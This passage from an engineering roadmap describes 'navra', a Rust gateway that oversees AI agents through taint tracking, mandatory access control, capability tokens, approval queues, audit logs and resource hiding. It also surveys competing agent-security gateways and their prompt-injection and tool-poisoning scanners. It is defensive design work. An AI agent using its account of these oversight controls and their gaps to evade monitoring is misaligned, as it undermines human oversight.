| MagenticLite/MagenticBrain (Microsoft Research) | 2 | Should cite |
| Proxy-Pointer RAG (2026) | 2 | Should cite |
| Microsoft RAMPART (2026-05-20) | 1 | **Must cite** |
| NVIDIA Verified Agent Skills / SkillSpector | 1 | **Must cite** |
| OpenAI Secure MCP Tunnels | 1 | Should cite |
| ClawPatrol (Enkrypt AI) | 1 | **Must cite** |
| IBM ContextForge | 1 | **Must cite** |
| Google AX distributed runtime | 2 | Should cite |
| WebWright self-verification (Microsoft Research) | 3 | Should cite |
| Microsoft network-level red teaming (2026-05) | 1 | **Must cite** |
| Dreadnode SDK red teaming (2605.04019) | 1 | Should cite |
| Anthropic MCP Tunnels + self-hosted sandboxes | 1 | Should cite |
| NemoClaw MCPS signing (Issue #204) | 1 | Should cite |
| MVAR dual-lattice IFC (github.com/mvar-security/mvar) | 1 | **Must cite** |
| NeuroTaint / Ghost in the Agent (arXiv:2604.23374) | 1 | **Must cite** |
| Shadow Escape zero-click MCP attack (Operant AI) | 1 | **Must cite** |
| auth.md agent registration (WorkOS, ID-JAG) | 1 | Should cite |
| MUSE-Autoskill skill lifecycle (2605.27366) | 2 | Should cite |
| MemForest hierarchical temporal memory (2605.23986) | 2 | Should cite |
| Claw-Anything always-on benchmark (2605.26086) | 3 | Should cite |
| K8s Agent Sandbox CRD (kubernetes-sigs) | 1 | Should cite |
| TurboVec / TurboQuant vector index (2504.19874) | 2 | Should cite |
| MCP 2026-07-28 RC (SEP-2567 session removal) | 1 | **Must cite** |
| Cloudflare Agent Memory 5-channel RRF | 2 | Should cite |
| Hermes Agent (Nous Research) | 2 | Should cite |
| gBrain knowledge layer (Garry Tan) | 2 | Should cite |
| OSCAR attention-aware KV cache quant (2605.17757) | 2 | Should cite |
| From Raw Experience to Skill Consumption (2605.23899) | 2 | Should cite |

#### 13d. Paper restructuring decisions

| Decision | Recommendation | Status |
|----------|---------------|--------|
| Paper 2 standalone vs fold into Paper 1 | Fold cognitive core into Paper 1 as persona-driven security policy. Paper 2's space (PersonaVLM, MTL, SemaClaw) is too crowded without external eval. | Decide |
| Paper 3 contributions | Drop JSON parsing resilience and flow resumability as contributions. Keep dynamic persona selection. Add c-CRAB evaluation. | Decide |
| Paper 1 venue | IEEE S&P workshop (ArtSec 2026) realistic. USENIX Security main requires adversarial eval + formal properties. | Decide |
| Paper 3 venue | SCORED (supply chain security) or ISSTA/ASE workshop. | Decide |

### Phase 14: Agentic OS completeness (2026-05-07)

navra already implements ~80% of an Agentic OS: process table,
IPC (BLP-gated mailbox + taint-on-read blackboard), memory
management (decay, budget, knowledge store), DAG scheduler with
GPU semaphore, MAC (Bell-LaPadula, both properties), capability
tokens, audit blackbox. Five gaps remain to complete the
abstraction.

#### 14a. Agent signal (async interrupt)

**Crate**: `navra-flow` (executor) + `navra-agent` (tool loop)

Currently agents can only be stopped via timeout or `team_shutdown`.
Add async signal delivery to running agents:

- `agent_signal(agent_id, signal)` with signal types: `Interrupt`
  (cancel current tool call, return partial), `Terminate` (graceful
  shutdown), `Pause` / `Resume` (per-agent, not global)
- Wired via `tokio::sync::watch` channel on the Agent's tool loop
- Checked between tool-call iterations (cooperative, not preemptive)
- Preemption of in-flight inference: cancel via llama.cpp abort /
  vLLM request cancellation API

**Effort**: 1-2 days. **Priority**: Medium.
**Acceptance**: `Interrupt` a running specialist mid-review, receive
partial output. `Terminate` cleans up resources.

#### 14b. Kernel state as MCP resources

**Crate**: `navra-core` (resource handlers)

Expose internal kernel state through the existing MCP resource
mechanism. No new namespace — use `navra://` URI scheme:

| Resource URI | Content |
|---|---|
| `navra://proc` | Process table: connected agents, rings, call counts |
| `navra://proc/{agent}/taint` | Current IFC taint label for agent session |
| `navra://proc/{agent}/capabilities` | Active capability set |
| `navra://ifc/labels` | All session taint labels |
| `navra://audit/recent` | Last N blackbox entries |
| `navra://budget/gpu` | GPU semaphore: permits used/available |

These are read-only MCP resources, accessible to agents with
appropriate clearance. Enables self-awareness: an agent can
check its own taint level before deciding whether to attempt a
write.

**Effort**: 1 day. **Priority**: Medium.
**Acceptance**: `resources/read` on `navra://proc` returns
JSON with all connected agents and their privilege levels.

#### 14c. Resource list filtering by agent permissions

**Crate**: `navra-core` (resource dispatch)

Currently `resources/list` returns all resources regardless of
agent permissions. Filter the resource list the same way tools
are filtered — agents only see resources they have clearance
to read.

- Apply path ACLs to `file://` resources
- Apply read clearance (Simple Security Property) to all resources
- Apply tool globs from capability tokens to resource URIs

This completes the capability namespace: an agent with restricted
permissions doesn't know that restricted resources exist.

**Effort**: 0.5 day. **Priority**: Medium.
**Acceptance**: Agent with `readonly` permissions sees fewer
resources in `resources/list` than agent with `developer`.

#### 14d. Agent process hibernation (KV cache checkpoint)

**Crate**: `navra-model-runtime` + `navra-agent`

Save and restore full agent state including model KV cache for
suspend/resume across sessions. The agent equivalent of process
hibernation.

**Two-tier save strategy:**

| Tier | What's saved | Size | Resume | Always |
|---|---|---|---|---|
| Conversation | Turns, taint, variables, DAG position | ~KB | Re-prompt (rebuild KV) | Yes |
| KV cache | llama.cpp state via `llama_state_save_file` | ~GB | Instant (no re-prompt) | Optional |

**KV cache compression**: TurboQuant safe config (q8 keys, turbo3
values) compresses KV cache ~3x with zero quality loss. A 128K
context Gemma 4 KV cache drops from ~18GB to ~6GB — saveable to
NVMe in seconds.

**Runtime compatibility:**

| Runtime | KV save | Mechanism |
|---|---|---|
| llama-server (direct) | Yes | `llama_state_save_file` / `llama_state_load_file` |
| llama-server (Podman) | Yes | Same, via volume mount |
| vLLM | No | Paged attention KV is internal, no save API |
| Ollama | No | No state save API |

Model runtime exposes a `supports_kv_checkpoint: bool` capability
flag. When unavailable, fall back to conversation-only save
(accept re-prompt latency on resume).

**Compile-time KV cache safety** (inspired by TokenSpeed):
Design the save/restore API so invalid cache states are
unrepresentable in the type system. Use Rust ownership to
enforce:
- A saved cache is consumed on load (no double-restore)
- Cache validity is tied to model identity + quantization config
  (type-level association, not runtime check)
- Reuse restrictions enforced at compile time, not by convention
TokenSpeed's dual-plane scheduler achieves this in C++; Rust's
affine types give us stronger guarantees natively.

**Effort**: 3-4 days. **Priority**: Medium-High.
**Acceptance**: Suspend a running agent, restart navra, resume
agent with restored conversation and KV cache. Measure resume
latency vs full re-prompt.

Reference: TokenSpeed compile-time KV cache safety (LightSeek
Foundation, 2026-05-07).

#### 14e. Preemptive scheduling (cancel in-flight generation)

**Crate**: `navra-model` (backend trait) + `navra-agent` (tool loop)

Cancel an ongoing model inference to give priority to a
higher-priority agent (e.g., voice input preempts batch review).

- Add `cancel(&self)` to `ModelBackend` trait
- `OpenAiBackend`: cancel via HTTP request abort
  (vLLM: `DELETE /v1/completions/{id}`, Ollama: close connection)
- llama.cpp: `llama_decode` supports abort flag
- Fair scheduling: per-agent token quotas prevent starvation.
  Agent exceeding quota gets deprioritized (next request queued
  behind others, not cancelled)
- Depends on 14a (agent signal) for the interrupt delivery path

**Effort**: 2-3 days. **Priority**: Medium.
**Depends on**: 14a, 14d (checkpoint before preemption).
**Acceptance**: Voice agent interrupts a batch review agent.
Batch agent's KV cache is checkpointed, voice agent gets GPU.
After voice completes, batch resumes from checkpoint.

### Phase 15: Rendra desktop app (updated 2026-05-29)

navra desktop app built on the rendra stack — Servo-based runtime
with rendra-ui components and rendra-ag-ui for agent activity.

**Stack** (all navra-ai repos):
- **rendra** — Servo + winit runtime, IPC bridge, `#[command]` macros
- **rendra-ui** — 25 CSS + JS components (`rd-*` tokens, dark/light)
- **rendra-ag-ui** — AG-UI protocol widget (streaming text, tool
  calls, reasoning steps, approval dialogs)

**Architecture**:
```
navra (MCP gateway) → Rust backend commands → rendra IPC
    → rendra-ag-ui widget + rendra-ui components
```

No Electron, no React, no browser dependency. Single Rust binary
ships the runtime. HTML/CSS/JS frontend uses rendra-ui tokens.

#### 15a. Agentic chat via rendra (HIGH)

**Repos**: navra (backend commands), rendra app (frontend)

- **Backend**: IPC commands (`chat_send`, `chat_history`,
  `session_list`, `session_resume`) wired to navra-agent's
  ReAct loop via rendra `#[command]` macro
- **Frontend**: rendra-ui chat layout with `rd-input`, `rd-card`
  components. rendra-ag-ui widget renders tool calls and
  reasoning steps inline
- **Streaming**: Agent responses stream through rendra IPC as
  AG-UI events (TextDelta, ToolCallStart, ToolCallEnd)
- **Multi-turn**: navra-memory WorkingMemory stores turns

**Effort**: 3-4 days. **Priority**: High.
**Acceptance**: Chat in rendra app uses tools, maintains context,
resumes sessions.

#### 15b. Live agent dashboard (HIGH)

**Repos**: navra (event source), rendra app (dashboard page)

- **Backend**: IPC event stream (`agent_connected`, `tool_call`,
  `ifc_taint_changed`, `safety_trigger`, `approval_requested`)
  from navra-core's `notify_session()` translated to AG-UI
- **Frontend**: rendra-ui cards for each connected agent showing
  taint level, active tool, token usage. rendra-ag-ui renders
  live tool call activity
- **Approval queue**: 9ac approval requests render as rendra-ag-ui
  confirmation dialogs — approve/deny from the dashboard

**Effort**: 2-3 days. **Priority**: High.
**Acceptance**: Connect agent, see it appear with live tool call
updates. Approve pending requests from dashboard.

#### 15c. Interactive flow DAG visualization (MEDIUM)

**Repos**: rendra app (DAG page)

- Layout via flexbox (no CSS Grid — Servo compat)
- Live DAG nodes change state as tasks execute (AG-UI events)
- Click node for details (persona, tools, output, IFC taint)

**Effort**: 2-3 days. **Priority**: Medium.
**Depends on**: 15b (AG-UI event stream).

#### 15d. Branding and polish (LOW)

- navra branding in rendra app
- Dark/light theme via rendra-ui `data-theme` attribute
- Token usage charts, model health indicators

**Effort**: 1-2 days. **Priority**: Low.

#### 15e. Embeddable rendra-ag-ui widget (LOW-MEDIUM)

The rendra-ag-ui widget is already designed as a self-contained
bundle. Domain apps embed it for agent activity visualization:

- `<script src="rendra-ag-ui.js">` — zero npm deps
- Configure: navra endpoint, auth token, theme
- AG-UI events: `onToolCall`, `onApprovalRequired`, `onError`
- IFC badge shows current taint level

**Effort**: 2-3 days (mostly in rendra-ag-ui repo). **Priority**: Low-Medium.

---

## Crate dependency diagram (planned)

```
navra-protocol          (no navra deps)
navra-model             (no navra deps)
navra-model-hub         (no navra deps)
navra-model-runtime     (no navra deps)
    ↓
navra-security          (protocol + model)
    ↓
navra-cognitive         (security)             PERSONAS
navra-agent             (protocol + model + security)  CLIENT
navra-memory            (security + rag)       PERSISTENCE
    ↓
navra-flow              (agent + cognitive + memory)   ORCHESTRATION
navra-core              (protocol + model + security)  SERVER
    ↓
navra-tools-*  ─────┐
navra-rag      ─────┼── (core only)
navra-modal-*  ─────┘
    ↓
navra-server            (all + hub + runtime)
```

## Ecosystem positioning

navra is a *Claw — a self-hosted AI agent gateway in the same
category as OpenClaw, NemoClaw, and IronClaw. It differentiates on
security depth (gateway-enforced IFC, deny-wins ACLs, in-process ML
safety) and orchestration (navra-flow DAG + mesh + mandates).

navra is domain-agnostic, not developer-only. Developer agents
(Claude Code, Goose) are one client type. Domain apps (lawyer
assistants, ops dashboards) connect as MCP clients and expose their
data as MCP servers — the bidirectional MCP pattern. See Phase 15
for the web UI that serves non-developer users directly.

```
Developer agents ──┐              ┌── downstream MCP servers
  Claude Code      │              │
  Goose            ├── MCP/SSE ──> navra ──┼── built-in modules
  Zed/JetBrains    │              │          └── local ONNX models
Domain apps      ──┘              │
  Lawyer app (↔ bidirectional)    └── domain MCP servers
  Ops dashboard                        (legal DBs, case law, etc.)
  Web UI (Phase 15)
```

### *Claw landscape (May 2026 analysis)

navra sits in the OpenClaw ecosystem — same architectural category
(self-hosted MCP gateway), different depth. Key comparisons:

- **OpenClaw**: Largest ecosystem (370k stars), messaging channels,
  ClawHub marketplace. Weak security (9 CVEs in 4 days, 12% malware
  rate on ClawHub, 135k exposed instances). Node.js.
- **NemoClaw** (NVIDIA): OpenClaw + OpenShell sandbox + YAML policies.
  Wrapper, not purpose-built. Closest to navra's security model
  but bolted-on rather than native.
- **IronClaw** (NEAR AI): Rust, TEEs, WebAssembly tool sandboxes,
  zero-trust capabilities. Independently validates navra's design
  choices. No orchestration.
- **SemaClaw** (Midea AI): DAG orchestration, PermissionBridge,
  three-tier context. Closest to navra-flow. Node.js. No gateway
  security model.
- **Kaiden** (Red Hat/Podman Desktop): Workspace + sandbox management
  for AI coding agents. Complementary layer — Kaiden manages where
  agents run, navra manages what they can access.

What navra has that no *Claw has: IFC as first-class primitive,
in-process ML safety filters, integrated multi-agent orchestration,
cognitive layer, Rust coherent system. What *Claws have that navra
is building: web UI (Phase 15), marketplace/registry (planned).

### Microsoft AGT relationship (May 2026 analysis)

- **Agent Governance Toolkit**: 7-package system (Python, TypeScript,
  Rust, Go, .NET) with Agent OS as stateless policy engine
- Sub-millisecond p99 latency, 13,000+ tests, covers all 10 OWASP
  Agentic Top 10 risks
- Framework-agnostic: hooks into LangChain, CrewAI, Google ADK,
  Microsoft Agent Framework
- **Architecture difference**: AGT is a library (agent embeds it) vs
  navra is a gateway (agent cannot bypass it). Different trust
  models — AGT trusts the agent runtime, navra does not.
- POSIX-inspired capability-based access controls (what agents *can*
  do), vs navra's deny-wins ACLs + IFC (what agents *must not* do
  + information flow tracking)
- **AGT lacks**: IFC/taint tracking, statistical guardrails, budget
  hooks, in-process ML safety, orchestration. These remain navra
  differentiators.
- **AGT has**: Better framework integration story (works with any
  framework via callbacks/decorators), wider language coverage
- **Watch**: AGT Rust package closely — if it gains IFC or gateway
  mode, it becomes a direct competitor

**Updated 2026-05-25**: AGT shipped MCP Extensions for .NET
(`Microsoft.AgentGovernance.Extensions.ModelContextProtocol`).
Adds startup tool scanning (8 threat categories: poisoning,
typosquatting, hidden instructions, schema abuse, hidden Unicode,
description injection, cross-server attacks, rug pulls), response
sanitization (prompt-injection tags, imperative overrides, credential
leakage, exfiltration URLs), YAML policy model (default_action: deny),
DID-based identity, and fail-closed defaults. Broader AGT base includes
execution rings (4 privilege levels), trust decay (0-1000 score),
Ed25519 plugin signing, saga orchestration, circuit breakers, and
kill switches. Upstream tool scanning (9m) is our most critical gap
identified from this comparison.

Reference: Microsoft AGT (github.com/microsoft/agent-governance-toolkit),
AGT architecture deep dive (TechCommunity blog, April 2026),
AGT MCP Extensions for .NET (DevBlogs, May 2026).

### Competitive landscape update (May 2026 tech watch)

The MCP gateway space exploded: 97M monthly SDK downloads, 30 CVEs
in 60 days, 88% of orgs reporting agent security incidents.

| Gateway | Threat | Key Feature | navra Advantage |
|---------|--------|-------------|-------------------|
| IBM ContextForge | HIGH | Cedar RBAC, A2A, 40+ plugins, 3500+ stars | IFC, in-process ML safety |
| Envoy AI Gateway | MEDIUM | MCPRoute v1beta1, CEL auth, AAIF/LF | Gateway-enforced IFC, orchestration |
| ClawPatrol (Enkrypt AI) | MEDIUM | 6 gateway hooks, cognitive file integrity, skill scanning | In-process ONNX (no cloud API), deny-wins ACLs |
| DefenseClaw (Cisco) | MEDIUM | Admission control + runtime guardrails + OpenShell | IFC, flow orchestration |
| Bifrost | LOW | 11us overhead at 5k RPS, dual client/server | IFC, ML safety, orchestration |
| Lasso Security | LOW | Prompt injection detection, reputation scoring | ML safety depth, IFC |
| Docker MCP Gateway | LOW | Container isolation, Scout scanning | No RBAC, no audit — dev tool only |

navra unique position: **IFC + in-process ML safety + flow
orchestration + OpenShell integration**. No single competitor
covers all four.

Critical gap from ClawPatrol: cognitive file integrity monitoring
(SHA-256 + semantic drift). Implement before it becomes expected
(Phase 9n).

Reference: Tech watch 2026-05-25, Lunar.dev gateway comparison,
Composio gateway ranking.

### IFC competitive landscape (May 2026 tech watch)

Three IFC-for-agents systems emerged as direct competitors to
navra-security's IFC module:

| System | Approach | F1 | Advantage | Gap vs navra |
|--------|----------|-----|-----------|----------------|
| FIDES (Microsoft Research) | Planner-level lattice IFC | 0.522 | Formal info-hiding primitives | Gateway-level > planner-level (can't be bypassed) |
| MVAR | Dual-lattice + crypto provenance | N/A (100% on 50-vector) | Execution firewall paradigm | Broader defense-in-depth stack |
| NeuroTaint | Semantic + causal + persistent | 0.928 | Semantic taint tracking | Inline label tracking is faster |
| **navra** | **Gateway-level 2×4 product lattice** | **TBD** | **Per-value IFC + statistical guardrails** | **No semantic/causal tracking** |

Key insights:
- Pure label-only IFC is insufficient (FIDES F1=0.522)
- navra must layer offline semantic audit (NeuroTaint-style) on
  top of inline label tracking for defense-in-depth
- Gateway-level enforcement remains architecturally superior — none
  of the competitors can enforce at the transport layer
- Cryptographic witness for declassification is a gap (11k)
- Adversarial benchmarking needed to establish navra's position (11l)

Reference: FIDES (arXiv:2505.23643), MVAR (github.com/mvar-security/
mvar), NeuroTaint (arXiv:2604.23374).

### Goose relationship (April 2026 analysis)

- Goose: Rust agent runtime (~v1.30, Apache-2.0, AAIF/Linux Foundation)
- Different layer: Goose = end-user agent, navra = security gateway
- Goose has NO auth tokens, NO ACLs, NO IFC, NO content filtering
- Goose connects to MCP servers directly (no proxy/filter)
- Contribution targets: MCP interceptor pattern (SEP-1763),
  Linux extension sandboxing, safety hook pipeline, ACL engine
- ACP adoption gives navra agents IDE integration for free

### ZeroClaw (April 2026 analysis)

- ZeroClaw: Rust agent runtime (<5MB memory, <10ms startup, 8.8MB binary)
- Trait-based architecture, TOML config, 3-tier autonomy
  (ReadOnly/Supervised/Full) — similar permission model to navra
- 70+ tools, 25+ messaging channels, hardware peripheral traits
  (ESP32/Arduino/RPi) — targets embedded/IoT
- Key difference: flat agent runtime vs navra's security gateway
- Potential collaboration: transport adapters, tool interface traits
- Watch for convergence — similar Rust + trait patterns, different layers
- Migrating OpenClaw users (positions as next-gen replacement)

### SemaClaw relationship (April 2026 analysis)

- SemaClaw: Open-source two-layer agent framework (arXiv 2604.11548)
- sema-code-core (Node.js agent runtime) + SemaClaw (application harness)
- Closest architectural parallel to navra-* crate family
- Same problems: permissions, DAG orchestration, memory with hybrid
  retrieval, structured context injection, persona identity
- Key differences (our advantages):
  - **Layer**: SemaClaw is a harness (wraps one framework).
    navra is a gateway (secures any framework that speaks MCP).
  - **Security depth**: Their PermissionBridge is binary
    (internal=allow, external=approve). Our IFC propagates taint
    labels through tool chains; deny-wins ACLs are more granular.
  - **Language**: Node.js vs Rust (type safety, no runtime, WASM,
    in-process ONNX).
  - **Model lifecycle**: No model management (external APIs only).
    We have hub → runtime → backend.
- What we borrowed: 4-layer plugin taxonomy (Phase 5h Module trait
  review), wiki-format knowledge output (Phase 3d), skill
  lazy-loading (Phase 1d).

### LangChain Agentic Engineering (April 2026 analysis)

- LangChain reframes multi-agent systems as "agentic engineering"
- Worker agents (ICs) + Leader agents (PMs) with shared memory
  and tooling. A2A for agent comms, MCP for tools.
- 93% debugging time reduction, 65% dev time reduction in pilot
- No security enforcement whatsoever — their "tool gateway" is an
  API aggregator, not a security layer
- Validates our architecture: their Worker/Leader = our DAG
  orchestrator/specialists, their tool gateway = navra (minus security)
- Human PR review as bottleneck supports cross-validation (Phase 5g)

### AWS Agent Registry (April 2026 analysis)

- Centralized agent/tool/MCP server catalog in Amazon Bedrock AgentCore
- MCP + A2A native, hybrid keyword+semantic search, governance workflow
- The registry itself is an MCP server (queryable by Kiro, Claude Code)
- Governance layer (who owns what, is it approved) complements navra's
  runtime security layer (what can it access, is the content safe)
- Non-English semantic search fails 33% of tests — test our local
  embeddings for multilingual quality
- Consider RegistryModule to proxy external registries (Phase 5f)

## Non-goals

These capabilities from the original Python prototype are intentionally NOT replicated:

- **Docker deployment**: Rust binary is self-contained
- **Python engine wrappers**: replaced by ModelBackend trait
- **Rich TUI**: Warp fork evaluated (2026-05-04) — warpui (MIT) is
  architecturally clean but AGPL contamination from internal deps
  makes extraction impractical. Adopt Warp's UX *patterns* (Phase 8)
  instead. Note: a *web* UI is in scope (Phase 15) — the non-goal
  is a native terminal UI, not a UI altogether.
- **A2A server**: navra already serves Agent Cards; A2A orchestration
  belongs in navra-flow, not as a separate service
- **Desktop app**: No Electron/Tauri wrapper. The web UI (Phase 15)
  runs in the browser. System tray + D-Bus for desktop integration.
  Domain apps embed the chat widget (Phase 15e) rather than navra
  shipping a standalone desktop app
- **Adopt rmcp**: Evaluated (2026-05-04). Our hand-rolled MCP types
  carry IFC labels and permissions extensions that rmcp doesn't
  support. Full spec coverage (Phase 9) closes the gap while
  preserving our differentiators. rmcp's `#[tool]` macro DX is
  replicated in Phase 9h.
